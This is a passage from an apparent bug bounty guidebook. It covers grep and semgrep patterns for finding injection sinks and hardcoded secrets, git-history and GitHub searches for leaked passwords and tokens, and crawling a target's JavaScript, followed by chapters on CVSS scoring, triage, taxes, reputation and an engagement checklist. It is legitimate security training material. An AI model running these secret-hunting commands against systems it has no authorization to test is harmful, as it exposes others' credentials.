# Install semgrep
pip install semgrep

# Run against Python codebase with security rules
semgrep --config=p/python-security .
semgrep --config=p/owasp-top-ten .
semgrep --config=p/nodejs-security .

# Run all security packs
semgrep --config=p/security-audit .

# Write a custom rule
cat << 'EOF' > custom_rules.yaml
rules:
  - id: python-eval-user-input
    patterns:
      - pattern: eval(request.$ATTR)
      - pattern: eval(request.args.get(...))
    message: "User input passed directly to eval()"
    severity: ERROR
    languages: [python]
EOF
semgrep --config=custom_rules.yaml .
```

### The Grep Cheat Sheet

```bash
# === COMMAND INJECTION ===
grep -rn "os\.system\|subprocess\.call\|subprocess\.run\|shell=True\|popen\|exec(" \
  --include="*.py" .

# === SQL INJECTION ===
# Look for string concatenation in SQL (the "+" is the tell)
grep -rn "execute.*\+\|query.*\+\|SELECT.*\+\|WHERE.*\+" --include="*.py" .
grep -rn "\$_.*['\"].*\." --include="*.php" . | grep -i "select\|where\|from"

# === XSS ===
grep -rn "innerHTML\s*=\|document\.write\|dangerouslySetInnerHTML\|v-html" \
  --include="*.js" --include="*.jsx" --include="*.vue" .

# === SSRF ===
grep -rn "requests\.get\|urllib\.request\|fetch\|http\.get" --include="*.py" --include="*.js" . \
  | grep "request\.\|req\.\|user\|input\|param"

# === OPEN REDIRECT ===
grep -rn "redirect\|Location:" --include="*.py" --include="*.php" --include="*.js" . \
  | grep "request\.\|\$_GET\|\$_POST"

# === PATH TRAVERSAL ===
grep -rn "open(\|file_get_contents\|readFile\|path\.join" \
  --include="*.py" --include="*.php" --include="*.js" . \
  | grep "request\.\|\$_GET\|\$_POST\|param\|input"

# === HARDCODED SECRETS ===
grep -rn "password\s*=\s*['\"][^'\"]\|api_key\s*=\s*['\"][^'\"]\|secret\s*=\s*['\"][^'\"]" \
  --include="*.py" --include="*.js" --include="*.php" .

# === DESERIALIZATION ===
grep -rn "pickle\.loads\|yaml\.load(\|unserialize\|Marshal\.load" \
  --include="*.py" --include="*.php" --include="*.rb" .

# === SSTI ===
grep -rn "render_template_string\|Environment(\|from_string\|jinja2\." \
  --include="*.py" . | grep "request\.\|input\|param"
```

### Reviewing Specific File Types

**Configuration files first:**

```bash
# Find all config files
find . -name "*.env" -o -name "*.cfg" -o -name "config.*" \
  -o -name "settings.*" -o -name "secrets.*" 2>/dev/null

# Often contains:
# - Database credentials
# - API keys
# - Secret keys for JWT/session
# - Debug flags
# - Allowed hosts (security headers)
```

**Git history reveals deleted secrets:**

```bash
# Show all commits
git log --oneline

# Search git history for deleted secrets
git log -p --all -- . | grep -i "password\|secret\|api_key\|token" | head -50

# Search for a specific pattern in all historical commits
git grep "SECRET_KEY" $(git rev-list --all)
```

### When You Only Have JavaScript (No Backend Source)

```bash
# Download all JS
gospider -s https://target.com -d 2 | grep ".js" | sort -u > js_urls.txt
cat js_urls.txt | xargs -I{} wget -q {}

# Search for API endpoints, tokens, and logic
grep -r "api\|token\|secret\|password\|authorization\|admin" *.js

# Look for client-side access control
grep -r "role\|isAdmin\|isSuperuser\|hasPermission" *.js

# Look for validation logic that might be bypassable
grep -r "validate\|sanitize\|escape\|encode" *.js
```

## Summary

Source code review is one of the most efficient bug hunting techniques when source is available. The core approach is taint analysis: trace user input from sources to dangerous sinks. Use grep patterns to rapidly identify high-value sinks (eval, exec, unserialize, SQL concatenation), then trace backward to find reachable sources. Semgrep automates pattern matching at scale. Even without backend source, JavaScript analysis and git history often reveal secrets and logic flaws.

## Checklist

- [ ] Identified the technology stack (Python, PHP, Node.js, Java, Ruby, Go)
- [ ] Found all configuration/environment files — checked for hardcoded secrets
- [ ] Searched git history for deleted secrets (`git log -p --all`)
- [ ] Ran semgrep with the appropriate security ruleset
- [ ] Used sink-first grep search for high-value functions (eval, exec, system, unserialize)
- [ ] Used source-first grep to find all user input entry points (request.*, $_GET, etc.)
- [ ] Traced identified sinks back to check if they receive user-controlled input
- [ ] Checked authentication and authorization middleware — is it applied consistently?
- [ ] Reviewed file upload handlers — where do files go? Are types validated server-side?
- [ ] Reviewed redirect handlers — is the destination URL validated?
- [ ] Checked for mass assignment vulnerabilities (ORM models accepting arbitrary fields)
- [ ] Documented each finding with file name, line number, vulnerable code, and exploit path

> _"All code is guilty until proven innocent."_ — Security Engineering Principle

---

# PART EIGHT: CAREER & MINDSET

---

# Chapter 45: Understanding CVSS v3 Scoring

## Objective

Learn how the Common Vulnerability Scoring System version 3 works, how to calculate scores for your findings, and how to use CVSS to communicate severity clearly and professionally in bug bounty reports.

## Prerequisites

- General familiarity with vulnerability concepts (all previous chapters)

## Terminology

|Term|Definition|
|---|---|
|**CVSS**|Common Vulnerability Scoring System — a standardized framework for rating vulnerability severity|
|**Base Score**|The fundamental score representing the intrinsic characteristics of a vulnerability|
|**Temporal Score**|Adjusts the base score based on factors that change over time (exploit availability, patch status)|
|**Environmental Score**|Adjusts for the specific environment where the vulnerability exists|
|**Attack Vector (AV)**|How the vulnerability is exploited: Network, Adjacent, Local, Physical|
|**Attack Complexity (AC)**|How hard it is to exploit: Low or High|
|**Privileges Required (PR)**|What privileges the attacker needs: None, Low, or High|
|**User Interaction (UI)**|Whether a victim must take action: None or Required|
|**Scope (S)**|Whether exploitation affects only the vulnerable component or others|
|**Confidentiality (C)**|Impact on data confidentiality: None, Low, High|
|**Integrity (I)**|Impact on data integrity: None, Low, High|
|**Availability (A)**|Impact on service availability: None, Low, High|

## Theory

### Why CVSS Matters in Bug Bounty

CVSS gives you a common language with the triage team. When you claim a vulnerability is "Critical," a reviewer may disagree. When you say "CVSS 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)," the reasoning is transparent and reproducible.

Understanding CVSS also helps you:

- Set realistic severity expectations before submitting
- Argue professionally if a triage team undersells your finding
- Build credibility as a researcher who thinks systematically about impact

### The Base Score Metrics

**Attack Vector (AV) — How can the attacker reach the target?**

|Value|Meaning|Score Weight|
|---|---|---|
|Network (N)|Exploitable remotely via internet — no physical proximity needed|Highest|
|Adjacent (A)|Requires being on the same network (LAN, Bluetooth, WiFi)|High|
|Local (L)|Requires local access to the system|Medium|
|Physical (P)|Requires physical access to the device|Lowest|

**Attack Complexity (AC) — How difficult is the attack?**

|Value|Meaning|
|---|---|
|Low (L)|No special conditions — attacker can exploit reliably and repeatedly|
|High (H)|Success depends on conditions outside attacker's control (race conditions, specific config)|

**Privileges Required (PR) — What does the attacker need before attacking?**

|Value|Meaning|
|---|---|
|None (N)|No authentication required|
|Low (L)|Standard user account required|
|High (H)|Admin/privileged account required|

**User Interaction (UI) — Does a victim need to take action?**

|Value|Meaning|
|---|---|
|None (N)|Attacker can exploit without any victim action|
|Required (R)|Victim must click a link, open a file, or take some action|

**Scope (S) — Does exploitation escape the vulnerable component?**

|Value|Meaning|
|---|---|
|Unchanged (U)|Exploitation affects only the vulnerable component|
|Changed (C)|Exploitation affects other components beyond the vulnerable one|

**Confidentiality / Integrity / Availability Impact (C/I/A):**

|Value|Meaning|
|---|---|
|None (N)|No impact|
|Low (L)|Some impact — access to some information or partial disruption|
|High (H)|Total loss — complete exposure of all data, complete corruption, or full outage|

### Calculating the Score

The actual formula is complex — use the official calculator. But the intuition:

- AV:N, AC:L, PR:N, UI:N → **Highest possible attack metrics** (anyone can exploit, easily, without help)
- S:C → **Scope changes** (exploiting one component affects others) → dramatically increases score
- C:H, I:H, A:H → **Maximum impact**

Combining all maximums: **CVSS 10.0**

### Common Vulnerability CVSS Examples

**Unauthenticated SQL Injection returning all user data (Critical):**

```
AV:N  → Network (accessible from internet)
AC:L  → Low (no special conditions)
PR:N  → None (no account needed)
UI:N  → None (no victim interaction)
S:U   → Unchanged (affects only the database)
C:H   → High (all user data exposed)
I:H   → High (data can be modified)
A:L   → Low (minor availability impact)

CVSS v3.1 Score: 9.8 — CRITICAL
Vector String: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L
```

**Stored XSS in user profile visible to admins (Medium/High):**

```
AV:N  → Network
AC:L  → Low
PR:L  → Low (need a user account to create a profile)
UI:R  → Required (admin must view the profile page)
S:C   → Changed (JS executes in admin's browser — different component)
C:L   → Low (can steal admin cookie — partial confidentiality)
I:L   → Low (can perform admin actions — partial integrity)
A:N   → None

CVSS v3.1 Score: 5.4 — MEDIUM
Vector String: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
```

**Command Injection — Authenticated (High):**

```
AV:N  → Network
AC:L  → Low
PR:L  → Low (requires regular user account)
UI:N  → None
S:U   → Unchanged
C:H   → High (read all files on server)
I:H   → High (write/modify server files)
A:H   → High (can crash server)

CVSS v3.1 Score: 8.8 — HIGH
Vector String: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
```

### Severity Ranges

|Score|Severity|
|---|---|
|0.0|None|
|0.1 – 3.9|Low|
|4.0 – 6.9|Medium|
|7.0 – 8.9|High|
|9.0 – 10.0|Critical|

### Common Scoring Mistakes

1. **Confusing UI:R** — Stored XSS that requires an admin to view a page is UI:R, not UI:N. The attacker doesn't interact, but a victim does.
2. **Forgetting S:C for XSS** — Successful XSS changes scope because the JavaScript runs in the browser context (a different component than the vulnerable server).
3. **Overrating PR:N** — If you need any account at all (even free signup), that is PR:L, not PR:N.
4. **Treating DoS as A:H always** — A:H means a complete outage, A:L means degraded service. Match the actual impact.

### Tools

```
Online calculators:
https://www.first.org/cvss/calculator/3.1
https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator

After calculating, copy the CVSS vector string for your report:
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

## Summary

CVSS v3 provides a standardized, reproducible method for scoring vulnerabilities. The Base Score has six metric groups: Attack Vector, Attack Complexity, Privileges Required, User Interaction, Scope, and CIA Impact. Higher scores result from network-accessible, low-complexity, unauthenticated, no-interaction vulnerabilities with full impact. Include the CVSS vector string in every bug report to demonstrate professional rigor and to set clear severity expectations.

## Checklist

- [ ] Understood all eight CVSS base metrics and their possible values
- [ ] Practiced scoring three example vulnerabilities using the FIRST.org calculator
- [ ] Can explain the difference between S:U and S:C (scope unchanged vs. changed)
- [ ] Understand why XSS often has S:C and why SQL injection often has S:U
- [ ] Know the score range for each severity level (Low 0.1–3.9, Medium 4–6.9, High 7–8.9, Critical 9–10)
- [ ] Include the CVSS vector string in every bug bounty report
- [ ] Never over-rate — inaccurate scoring damages credibility with triage teams
- [ ] Can argue professionally for a score if a triage team rates lower than you believe is accurate

> _"Severity is not about your excitement level — it is about real impact on real users."_ — Bug Bounty Wisdom

---

# Chapter 46: Handling Duplicates, Triage & Program Communication

## Objective

Develop professional communication skills for navigating the bug bounty process — from the moment you submit a report through triage, duplicate resolution, disputes, and closure.

## Prerequisites

- Chapter 28: Writing Professional Bug Reports
- Chapter 29: Bug Bounty Platforms

## Terminology

|Term|Definition|
|---|---|
|**Duplicate**|A vulnerability that has already been reported by another researcher|
|**Triage**|The process of reviewing, validating, and classifying a submitted report|
|**Triager**|The person reviewing and classifying your report (may be an employee or contracted reviewer)|
|**N/A (Not Applicable)**|A report closed as not applicable — typically out of scope, not a security issue, or acceptable risk|
|**Informational**|A finding acknowledged but not rewarded, often due to low impact|
|**Retesting**|Verifying that a vulnerability has been successfully fixed after the company patches it|
|**Disclosure**|Making a vulnerability public — most programs require a waiting period|
|**SLA**|Service Level Agreement — the response time the program commits to|
|**Signal**|HackerOne's reputation metric reflecting report quality|
|**Reputation**|A score on bug bounty platforms reflecting a researcher's historical quality|

## Theory

### The Triage Timeline

Understanding what happens after you submit helps you set realistic expectations:

```
Report Submitted
↓
Automated acknowledgment (immediate on most platforms)
↓
Triager assigned (hours to days depending on queue)
↓
Initial review: Is it in scope? Is it a security issue? (hours to days)
↓
Technical validation: Can we reproduce it? (days to weeks)
↓
Severity assessment: Internal CVSS scoring (days)
↓
Bounty decision: Does this meet payout criteria? (days)
↓
Bounty awarded (days to months after submission)
↓
Fix development, testing, deployment (weeks to months)
↓
Report closed / disclosed
```

Programs with high volume can take weeks just to reach initial triage. This is normal.

### When You Get a Duplicate

Duplicates are the most frustrating part of bug bounty. You found a real vulnerability, but someone reported it first. Your work earns nothing.

**How to handle it professionally:**

1. **Do not argue about the date.** The platform records submission timestamps. If you submitted after, you submitted after.
2. **Ask when the original was reported.** Knowing if you were one hour or one month behind changes how you feel and what you learn.
3. **Review your methodology.** If someone found it first, where could you have been faster? Automation? A different entry point?
4. **Some programs pay partial rewards for duplicates** — check the program policy. HackerOne allows programs to reward duplicate finders at their discretion.
5. **Respond graciously.** A simple "Understood, thanks for the clarification" maintains goodwill.

### When You Disagree with a Decision

Triage teams make mistakes. Severity can be underrated. Reports can be closed as N/A incorrectly. When you disagree:

**Step 1: Re-read the program policy.** Are you absolutely sure this is in scope? Is this definitively a security issue and not intended behavior?

**Step 2: Request clarification politely.** Do not accuse — ask:

> "Thank you for reviewing this. I'd like to understand the decision better. Could you clarify why this is considered out of scope? My reading of the policy suggested [X component] was in scope. Happy to be corrected if I misunderstood."

**Step 3: Provide additional evidence.** If you believe impact was underrated, demonstrate it more clearly. Video PoC is more persuasive than text.

**Step 4: Escalate respectfully.** HackerOne and Bugcrowd have mediation options. Use them only after direct communication has failed. Do not immediately escalate — it signals poor communication skills.

**Step 5: Know when to move on.** Some decisions will stand regardless of your argument. Spending weeks disputing a $200 finding costs you time worth more than $200.

### Communication Anti-Patterns to Avoid

These behaviors harm your reputation and often result in bans:

|Anti-Pattern|Why It's Harmful|
|---|---|
|Demanding faster response|Pushes your report to the bottom; damages relationships|
|Threatening disclosure to pressure payment|This is extortion — it is illegal in most jurisdictions|
|Submitting the same bug twice|Wastes triage time, harms your signal/reputation score|
|Mass-submitting low-quality reports|Identified quickly, damages reputation permanently|
|Being rude to triagers|They are human, they have discretion, they talk to each other|
|Publicly disclosing before the fix|Breaks trust, may violate terms, harms affected users|
|Padding severity in reports|Erodes credibility when triage teams see through it|

### The Follow-Up Template

After a week of silence on a triaged report:

> "Hello, I wanted to follow up on report #XXXXX. I understand you may be experiencing high volume. Could you provide a brief status update? I'm happy to provide any additional information needed for validation. Thank you."

After two weeks without triage (report still "New"):

> "Hello, I submitted report #XXXXX on [date]. It has not yet been triaged. Could you let me know if any additional information would be helpful? I want to make sure it has what it needs for review."

Keep it brief, professional, and helpful in tone. Do not submit more than two follow-ups before the SLA expires.

### Understanding Reputation Systems

**HackerOne Signal:** Calculated from your recent reports. A high signal (positive) comes from valid, well-written reports. N/A and informational reports hurt signal. Duplicate reports have neutral impact (no signal change in most cases).

**Bugcrowd Priority Points:** Awarded based on the P1–P4 (Priority 1–4) classification of accepted reports.

Protect your reputation:

- Only submit when you are confident the vulnerability is real and in scope
- Write clear, complete reports that minimize back-and-forth
- Withdraw a report if you realize it was wrong before triage

### When to Disclose Publicly

Most programs have a 90-day disclosure policy (following Google Project Zero's standard). After the fix is deployed:

1. Ask the program for permission to disclose
2. Most programs will agree, or ask for a short delay
3. Write a clean public write-up explaining the bug, your methodology, and what you learned
4. Publish on your blog, HackerOne's Hacktivity, or Medium
5. Public write-ups build your reputation and help other researchers learn

## Summary

Bug bounty communication is a professional skill. Duplicate reports are a fact of life — handle them with grace and use them to improve speed. Triage disputes require patience, evidence, and politeness. Threatening or aggressive communication is both unethical and counterproductive. Understanding the triage timeline prevents frustration. Protecting your platform reputation — by submitting quality over quantity — pays dividends in private program invitations and program relationships.

## Checklist

- [ ] Understand the typical triage timeline (days to weeks is normal)
- [ ] Know how to respond to a duplicate professionally (thank the team, ask for timing, move on)
- [ ] Know the correct escalation process for disputed decisions (clarification → evidence → mediation)
- [ ] Have templates ready for professional follow-up messages
- [ ] Know what behaviors harm platform reputation (demanding payout, mass submissions, threats)
- [ ] Understand how HackerOne Signal works
- [ ] Know the 90-day disclosure standard and how to request public disclosure
- [ ] Never threaten disclosure to pressure payment
- [ ] Have a policy for withdrawing incorrect reports before they are triaged

> _"Your reputation in this community is worth more than any single bounty."_ — Every Experienced Bug Hunter

---

# Chapter 47: Taxes, Income & Bug Bounty as a Career

## Objective

Understand the financial and practical realities of bug bounty income — how to track earnings, what tax obligations typically apply, how to structure your work professionally, and what full-time bug bounty work actually looks like.

## Prerequisites

None — this chapter is about the business side of bug bounty hunting.

## Terminology

|Term|Definition|
|---|---|
|**Self-Employment Tax**|Taxes paid by freelancers and independent contractors on their earnings|
|**1099**|A US tax form that platforms may issue for payments over $600 in a year|
|**W-8BEN / W-9**|Tax forms required by US platforms for payment processing (W-9 for US, W-8BEN for non-US)|
|**Quarterly Estimated Tax**|Advance tax payments self-employed individuals may be required to make|
|**Sole Proprietor**|Operating a business as an individual without formal business incorporation|
|**LLC**|Limited Liability Company — a business structure that provides liability protection|
|**Deductible Expense**|A business expense that can be subtracted from taxable income|
|**Burn Rate**|Your monthly expenses — the income you need to sustain yourself|
|**Portfolio Program**|Multiple bug bounty programs you regularly test on|

## Theory

### Bug Bounty Income Is Taxable

In virtually every country, bug bounty payments are taxable income. The platforms pay you as an independent contractor, not an employee. This means:

- **No taxes are withheld.** You receive the full bounty amount, but taxes are your responsibility.
- **You may owe self-employment tax** (in the US, approximately 15.3% on top of income tax for the first $160,200 of net earnings in 2024).
- **Quarterly estimated payments may be required** if your tax liability will exceed a threshold.

**Important disclaimer:** Tax laws vary significantly by country, state, and individual situation. This chapter provides general guidance — consult a qualified tax professional for advice specific to your situation.

### US-Specific Basics

**When you'll receive a 1099:** HackerOne, Bugcrowd, and other US platforms issue a 1099-NEC (Non-Employee Compensation) if you are a US person earning more than $600 in a calendar year. You must report all income even if you do not receive a 1099.

**Filling out tax forms for the platform:**

```
US residents:     Fill out W-9 (name, address, SSN or EIN)
Non-US residents: Fill out W-8BEN (claims treaty benefits if applicable)
```

**Quarterly estimated taxes:** If you expect to owe more than $1,000 in federal taxes, you should make quarterly payments (April, June, September, January). Missing these can result in underpayment penalties.

```
Common rule of thumb: set aside 25–30% of every bounty payment for taxes
(Adjust based on your country, income level, and deductions)
```

### Tracking Income and Expenses

Keep meticulous records from day one.

**Income tracking:**

```
Create a spreadsheet with:
- Date of bounty payment
- Program name
- Report ID
- Amount (before any platform fees)
- Platform fee deducted
- Net payment received
- Currency (convert to local currency at date of payment)
- Platform (HackerOne, Bugcrowd, Intigriti, etc.)
```

**Deductible Business Expenses (consult a tax professional to confirm in your jurisdiction):**

|Expense|Notes|
|---|---|
|Computer hardware|Laptops, external drives, test phones|
|Software subscriptions|Burp Suite Pro, cloud VMs, VPN services|
|Home office|Portion of rent/mortgage if dedicated space|
|Internet|Business portion of internet bill|
|Professional development|Books, courses, conference tickets|
|CTF entry fees|If for skills development|
|VPS / cloud computing|AWS, DigitalOcean, Linode|
|Bug bounty platform subscriptions|Any paid tiers|

### Business Structure Considerations

**As a beginner (low income):** Operating as a sole proprietor is simplest. No formal registration needed in most places — you simply report income as self-employment income.

**As income grows (generally $30,000–$50,000+ USD annually):** Consider consulting a CPA about forming an LLC or equivalent structure in your country. Benefits may include:

- Limited personal liability (someone can't sue your personal assets as easily)
- Potential tax advantages (S-Corp election in the US can reduce self-employment tax)
- Professionalism when working with programs that prefer business entities

### What Full-Time Bug Bounty Actually Looks Like

Most full-time bug bounty hunters don't talk about the reality. Here it is.

**Income is highly variable:**

```
Month 1: $0     (learning, environment setup, reading programs)
Month 2: $200   (first small find)
Month 3: $0     (lots of duplicates)
Month 4: $3,500 (one good find)
Month 5: $500
Month 6: $8,000 (a critical in a high-paying program)

Average: ~$2,033/month — but the range is $0 to $8,000
```

**A more sustainable full-time approach:**

1. Have 6 months of living expenses saved before going full-time
2. Maintain a "portfolio" of 5–10 programs you regularly test
3. Diversify: some hunters combine bug bounty with part-time consulting, CTFs, or freelance pentesting
4. Track your hourly rate: total bounties ÷ hours spent. Below your target? Adjust your approach.
5. Set a floor: "If I earn less than X in three consecutive months, I take contract work"

**Geographic advantages:** Bounty amounts are USD-denominated on global platforms. A researcher in a lower cost-of-living country can sustain a comfortable full-time income on the same earnings that would be insufficient in San Francisco or London.

### Tax Across Countries (General Guidance Only)

|Country|General Approach|
|---|---|
|United States|Self-employment income; Schedule C; quarterly estimated taxes; 1099-NEC from platforms|
|United Kingdom|Self-assessment; Class 4 NI contributions; register as self-employed|
|India|Income from "Other Sources" or business income; advance tax if liability > ₹10,000|
|European Union|Varies by country; generally freelance/self-employed income; VAT may apply above thresholds|
|Canada|Business income; CPP contributions on self-employment; HST/GST registration if over threshold|

**Always: consult a local tax professional before your earnings become significant.**

## Summary

Bug bounty income is real income and carries real tax obligations. Set aside 25–30% of every payment from day one. Track all income and deductible expenses with a simple spreadsheet. Fill out required platform tax forms (W-9 or W-8BEN). As income grows, consider consulting a CPA about business structure. Full-time bug bounty is viable but income is highly variable — financial cushion and diversification are essential. The geographic cost-of-living arbitrage makes full-time hunting more accessible to researchers outside high-cost cities.

## Checklist

- [ ] Filed the required tax form with each platform (W-9 or W-8BEN)
- [ ] Set up a separate bank account or tracking system for bug bounty income
- [ ] Created a bounty tracking spreadsheet (date, program, amount, currency)
- [ ] Begun setting aside 25–30% of each payment for taxes (adjust for your country)
- [ ] Identified what business expenses are deductible in your jurisdiction (consult a professional)
- [ ] Keeping receipts for all business purchases (hardware, software, subscriptions)
- [ ] Consulted (or planned to consult) a local tax professional once earnings become significant
- [ ] Understand quarterly estimated tax requirements if applicable in your country
- [ ] Realistic income expectations set — have savings buffer before considering full-time

> _"Treat bug bounty like a business from day one, even if it feels like a hobby. Your future accountant will thank you."_ — Experienced Bug Hunter

---

# Chapter 48: Building a Reputation and Getting Invited to Private Programs

## Objective

Understand how bug bounty reputation is built, what triggers private program invitations, how to optimize your profile and public presence, and how to accelerate the path from public programs to the more lucrative private invitation-only ecosystem.

## Prerequisites

- Chapter 1: What Is Bug Bounty Hunting?
- Chapter 29: Bug Bounty Platforms
- At least some experience submitting reports

## Terminology

|Term|Definition|
|---|---|
|**Private Program**|A bug bounty program available only to invited researchers — not publicly listed|
|**Invitation**|An offer to join a private program, sent based on a researcher's reputation and stats|
|**Hall of Fame**|A public acknowledgment page maintained by a company listing researchers who found bugs|
|**Write-up**|A public post-disclosure article explaining how you found and exploited a vulnerability|
|**CVE**|A Common Vulnerabilities and Exposures entry — assigned to publicly disclosed vulnerabilities|
|**H1 Top 100**|HackerOne's list of their top 100 researchers by reputation|
|**Signal**|HackerOne's report quality metric (see Chapter 46)|
|**Leaderboard**|Program-specific or platform-wide ranking of researchers by reputation/earnings|
|**Community**|The bug bounty community on Twitter/X, Discord, and forums — a major networking asset|

## Theory

### Why Private Programs Matter

Public programs are open to all researchers. This means:

- High competition — thousands of researchers testing the same scope
- Most easy-to-find bugs are already found
- Triage teams are overwhelmed

Private programs are invitation-only. They typically offer:

- **Less competition** — fewer researchers, more fresh vulnerabilities
- **Higher payouts** — companies use private programs for their most valuable products
- **Better relationships** — smaller researcher pool means more direct interaction
- **First access to new scope** — companies often add scope to private programs first

The goal: get invited.

### What Triggers Invitations

Platforms send invitations algorithmically based on your profile. The key factors:

**1. High Signal / Reputation Score**

Every valid, well-written report increases your reputation. The platform algorithms favor researchers with consistently high signal — meaning a high ratio of valid-to-invalid reports. Quality beats quantity every time.

**2. Report Volume and Recency**

Active researchers who have submitted reports recently (last 30–90 days) are favored. Dormancy hurts. Stay active, even with smaller finds.

**3. Specific Technology Expertise**

Private programs target researchers with expertise matching their stack. If you specialize in iOS apps, you get invited to mobile app programs. If you have strong web skills, you get web app invitations. Developing a specialty — and making it visible in your profile — helps.

**4. Past Collaboration with That Company**

Found a bug in a company's public program? You are much more likely to be invited to their private program. This is often how the pipeline works: public → relationship → private.

**5. Platform-Specific Criteria**

|Platform|Key Reputation Factors|
|---|---|
|HackerOne|Signal score, Reputation points, H1 CTF participation|
|Bugcrowd|Priority Points, Kudos, target-specific performance|
|Intigriti|Report quality, community involvement|
|Synack|Application process + background check + skills assessment|

### Building Your Reputation Systematically

**Phase 1: The First 20 Valid Reports (0–6 months)**

Focus entirely on quality and learning. Choose 3–5 beginner-friendly programs with clear scope. Submit only when you are confident. A single valid High report is worth more reputation-wise than 10 informational/N/A submissions that drag your signal down.

**Phase 2: Develop a Specialty (6–18 months)**

Pick a vulnerability class or technology stack to master:

- Android apps + mobile API vulnerabilities
- GraphQL/API security
- OAuth and authentication flows
- Business logic bugs in fintech or e-commerce
- Source code review for JavaScript/Node.js

Becoming known as "the GraphQL person" or "the mobile person" in the community increases invitation relevance.

**Phase 3: Build Public Presence (ongoing)**

Public visibility creates a reputation that extends beyond platform metrics:

**Write-ups:**

- Every significant finding deserves a public write-up (after disclosure)
- Platform: personal blog, HackerOne Hacktivity, Medium, dev.to
- Good write-ups get shared, followed, and referenced

**Twitter/X:**

- Share findings (sanitized), methodology tips, and learning content
- Follow and engage with established researchers
- The community is genuinely collaborative — ask questions publicly

**CTFs:**

- Competing in CTFs (especially web security CTFs) builds skills AND visibility
- HackerOne, Intigriti, and others run their own CTFs that directly feed private invitations

**Conference Talks:**

- Speaking at security conferences (DEF CON, Black Hat, local BSides) is the fastest reputation builder
- Start at local BSides (free, community-driven) with a focused topic
- A single conference talk generates invitations for years

### Your Platform Profile — Optimize It

A complete, professional platform profile signals seriousness:

```
HackerOne profile checklist:
├── Profile photo (real or professional avatar)
├── Complete bio (your specialty, background, skills)
├── Website or blog link
├── Twitter/social link
├── Completed all available profile settings
└── Disclosed reports linked (shows your work publicly)
```

### Direct Outreach to Companies

Some private programs accept applications or direct outreach:

1. **Email the security team** — Find `security@company.com` or use their security.txt
2. **Reference specific prior work** — "I found bug #XXX in your public program last year"
3. **Offer a specific skill** — "I specialize in iOS app testing and noticed your app is in scope on Bugcrowd"

This works better than most people expect, particularly for companies with security teams that value direct researcher relationships.

### Synack Red Team — A Different Path

Synack is an invitation-only, background-checked platform with a formal application process:

1. Apply at synack.com/red-team
2. Pass a skills assessment (the OWASP Juice Shop-based assessment)
3. Background check
4. If accepted: access to high-paying, vetted private programs

Synack pays well and has strict quality standards. It is the "top tier" of private programs for many researchers.

### The Community Dividend

The bug bounty community is unusually collaborative. Unlike most competitive fields, experienced researchers share techniques, tools, and tips generously. Investing in the community pays dividends:

- Answering questions in Discord helps others and builds your visibility
- Sharing a new technique gets you known as a contributor
- Collaborating with another researcher often leads to mutual program invitations
- Mentors who are senior researchers can provide private program referrals

## Summary

Private program invitations are triggered by platform reputation (Signal score, quality report history), technology specialization, and public visibility. Build reputation through consistent quality reports, not volume. Develop a specialty and make it visible in your profile and public write-ups. Write about every significant finding after disclosure. Participate in community CTFs and forums. A single well-known write-up or conference talk can generate private invitations for years. The path from public to private programs takes 6–18 months of consistent, quality work — and it is well worth the investment.

## Checklist

- [ ] HackerOne/Bugcrowd profile is 100% complete with bio, specialty, and links
- [ ] Have at least 5 valid, accepted reports on a public program
- [ ] Signal score is positive (not dragged down by N/A or informational reports)
- [ ] Have written at least one public write-up after disclosure
- [ ] Active on Twitter/X or security Discord — visible in the community
- [ ] Identified a technical specialty to develop (mobile, GraphQL, OAuth, etc.)
- [ ] Participated in at least one CTF (HackerOne CTF, Intigriti CTF, or similar)
- [ ] Platform profile is optimized — visible specializations, public reports linked
- [ ] Understand the criteria for private program invitations on your primary platform
- [ ] If targeting Synack: reviewed the application requirements and assessment format

> _"The people who get invited to the best programs are the ones who made themselves impossible to ignore."_ — Senior Bug Bounty Researcher

---

# PART NINE: MASTER CHECKLISTS

---

# Chapter 49: The Ultimate Bug Bounty Field Checklist

## Objective

Provide a single, comprehensive master checklist to run through during every bug bounty engagement — from initial scope review to post-submission follow-up. Use this as a living document alongside every real engagement.

## Prerequisites

All previous chapters.

## How to Use This Checklist

This chapter is designed to be used, not just read. Print it out, save it as a template, copy it into Notion or Obsidian — and check items off during every engagement.

The checklist is organized by phase. Not every section applies to every target. If the target is a web-only application with no mobile app, skip Section 6. If the program has no API documentation, the API section will be lighter. Use judgment — the goal is thoroughness, not bureaucracy.

A bug bounty engagement is not a one-day sprint. Use this checklist over days or weeks as you return to the target repeatedly with fresh eyes.

---

## Section 1: Before You Start — Scope Review, Legal, and Setup

**Legal & Authorization**

- [ ] Read the complete program policy from start to finish (not just skimmed)
- [ ] Confirmed the target is on the program I am testing (not just a related domain)
- [ ] Noted all **in-scope** domains, IP ranges, apps, and endpoints
- [ ] Noted all **explicitly out-of-scope** items
- [ ] Noted prohibited testing behaviors (no automated scanners, no DoS, no social engineering)
- [ ] Confirmed payment structure: bounty table, what qualifies for payout, what is informational only
- [ ] Checked the program's response time / SLA so I know when to follow up
- [ ] Confirmed I am not testing from a country or IP range blocked by the program
- [ ] Understood the disclosure policy (90-day standard? Custom terms?)

**Setup & Environment**

- [ ] Burp Suite is running and intercepting correctly
- [ ] Burp's CA certificate is installed in the browser
- [ ] FoxyProxy or equivalent proxy switcher is configured
- [ ] Created two fresh test accounts on the target (Account A and Account B for IDOR testing)
- [ ] Noted Account A and Account B credentials, IDs, and resource identifiers in notes
- [ ] Set up a dedicated folder/workspace for this target (recon output, screenshots, notes)
- [ ] Burp Project file created for this specific target
- [ ] VPN or testing infrastructure configured if needed (some programs require specific regions)
- [ ] Burp Collaborator is accessible (test it: Burp → Collaborator → Poll now)

---

## Section 2: Reconnaissance Phase

**Passive Reconnaissance**

- [ ] Ran subfinder, amass, and crt.sh enumeration against the primary domain
- [ ] Combined and deduplicated all subdomain results
- [ ] Checked shodan.io for exposed services (`hostname:target.com`)
- [ ] Ran waybackurls / gau to pull historical endpoints
- [ ] Searched GitHub for the company's code: `org:companyname`
- [ ] Searched for leaked secrets on GitHub: `"target.com" password`, `"target.com" api_key`
- [ ] Checked DNS records: A, AAAA, CNAME, MX, TXT (look for SPF, DMARC, verification tokens)
